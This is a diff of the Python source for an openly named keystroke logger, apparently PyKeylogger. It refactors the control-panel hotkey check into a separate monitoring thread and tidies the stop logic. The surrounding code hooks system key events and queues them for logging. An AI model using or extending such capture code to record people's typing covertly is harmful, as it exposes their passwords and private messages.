@@ -45,6 +45,7 @@ from supportscreen import SupportScreen, ExpirationScreen
 import Tkinter, tkMessageBox
 import myutils
 import Queue
+import threading
 
 class KeyLogger:
     ''' Captures all keystrokes, puts events in Queue for later processing
@@ -58,7 +59,8 @@ class KeyLogger:
         self.NagscreenLogic()
         self.q = Queue.Queue(0)
         self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
-        self.panel = False
+        #self.panel = False
+        self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.controlKeyHash)
         if os.name == 'nt':
             self.hm = pyHook.HookManager()
             self.hm.KeyDown = self.OnKeyDownEvent
@@ -80,7 +82,9 @@ class KeyLogger:
             pythoncom.PumpMessages()
         if os.name == 'posix':
             self.hm.start()
-    
+            
+        self.hashchecker.start()
+           
     def ParseControlKey(self):
         self.controlKeyList = self.settings['General']['Control Key'].split(';')
         
@@ -99,7 +103,7 @@ class KeyLogger:
 
     def CheckForControlEvent(self):
         if self.cmdoptions.debug:
-            self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
+            pass#self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
         if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
             return True
         else:
@@ -116,11 +120,11 @@ class KeyLogger:
         
         self.MaintainControlKeyHash(event, 'Down')
         
-        if self.CheckForControlEvent():
-            if not self.panel:
-                self.lw.PrintDebug("starting panel")
-                self.panel = True
-                PyKeyloggerControlPanel(self.cmdoptions, self)
+        #~ if self.CheckForControlEvent():
+            #~ if not self.panel:
+                #~ self.lw.PrintDebug("starting panel")
+                #~ self.panel = True
+                #~ PyKeyloggerControlPanel(self.cmdoptions, self)
                 #mypanel.start()
 
         #~ if event.Key == self.settings['General']['Control Key']:
@@ -135,17 +139,19 @@ class KeyLogger:
         self.MaintainControlKeyHash(event, 'Up')
         return True
     
+    def cancel(self):
+        self.stop()
+    
     def stop(self):
         '''Exit cleanly.
         '''
         
         if os.name == 'posix':
             self.hm.cancel()
-            print 'stuff3'
         self.lw.cancel()
-        print 'stuff4'
+        self.hashchecker.cancel()
+        #print threading.enumerate()
         sys.exit()
-        print 'stuff5'
     
     def ParseOptions(self):
         '''Read command line options
@@ -219,7 +225,39 @@ class KeyLogger:
                 root.destroy()
                 del(warn)
                 sys.exit()
-                
+
+class ControlKeyMonitor(threading.Thread):
+    def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
+        threading.Thread.__init__(self)
+        self.finished = threading.Event()
+        self.panel=False
+        self.lw = logwriter
+        self.mainapp = mainapp
+        self.cmdoptions = cmdoptions
+        self.controlKeyHash = controlkeyhash
+        
+    def run(self):
+        while not self.finished.isSet():
+            if self.CheckForControlEvent():
+                if not self.panel:
+                    self.lw.PrintDebug("starting panel")
+                    self.panel = True
+                    PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
+            time.sleep(0.05)
+    
+    def CheckForControlEvent(self):
+        #if self.cmdoptions.debug:
+            #pass#self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
+        if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
+            return True
+        else:
+            return False
+        
+        
+    def cancel(self):
+        self.finished.set()
+        
+
 if __name__ == '__main__':
     
     kl = KeyLogger()
